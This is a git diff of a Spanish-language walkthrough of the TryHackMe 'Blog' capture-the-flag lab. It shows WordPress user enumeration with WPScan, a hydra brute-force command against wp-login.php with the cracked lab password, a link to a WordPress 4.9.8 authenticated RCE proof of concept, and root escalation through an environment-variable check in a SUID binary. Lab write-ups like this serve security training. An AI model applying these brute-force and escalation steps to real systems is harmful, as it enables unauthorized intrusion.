@@ -21,7 +21,7 @@ Añadimos blog.thm a /etc/hosts
 Teniendo un Wordpress lo primero es tirar de WPScan
 ```bash
 wpscan --url blog.thm -e u
-`` 
+```
 Enumeramos usuarios
 ```
 [i] User(s) Identified:
@@ -54,5 +54,35 @@ Tiramos de BruteForcing
 ```
 hydra -l kwheel -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
 [80][http-post-form] host: 10.10.109.134   login: kwheel   password: cutiepie1
-
 ```
+Sabiendo la version buscamos un Authenticated RCE y encontramos un CVE , como en esta casa no usamos Metasploit buscamos el POC del CVE
+```
+https://github.com/brianwrf/WordPress_4.9.8_RCE_POC
+```
+Una vez seguidos los pasos tenemos shell
+
+## Privesc
+
+Encontramos un SUID un tanto raro
+```
+/usr/sbin/checker
+```
+Lo observamos con ltrace y tenemos lo siguiente
+```
+getenv("admin") = nil
+puts("Not an Admin"
+    Not an Admin
+  ) = 13
+  ++ + exited(status 0) ++ +
+```
+Parce que lo que hace es verificar si una env variable tiene algún value
+```
+www-data@blog:/home/bjoel$ export admin=13
+```
+Y ya simplemente ejecutamos el SUID file en cuestión y pa dentro
+```
+www-data@blog:/home/bjoel$ /usr/sbin/checker
+root@blog:/home/bjoel# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+```
+Y listo
